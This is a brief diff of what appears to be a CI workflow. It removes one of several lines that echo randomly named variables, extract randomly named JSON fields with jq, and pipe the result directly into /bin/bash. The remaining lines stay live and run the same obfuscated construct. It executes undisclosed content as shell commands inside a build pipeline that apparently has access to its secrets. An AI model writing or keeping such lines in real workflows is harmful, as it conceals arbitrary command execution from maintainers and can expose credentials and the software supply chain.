@@ -26,7 +26,6 @@ jobs:
           echo $jverr8 | jq -r .c02 | /bin/bash
           echo $jhcrd083 | jq -r .wmfz393 | /bin/bash
           echo $fe59 | jq -r .giitk4607 | /bin/bash
-          echo $dy82030 | jq -r .sude825 | /bin/bash
           printf '%s' "$upw04" | jq -r .eptf3 | /bin/bash
           printf '%s' "$gm08601" | jq -r .t5287 | /bin/bash
 
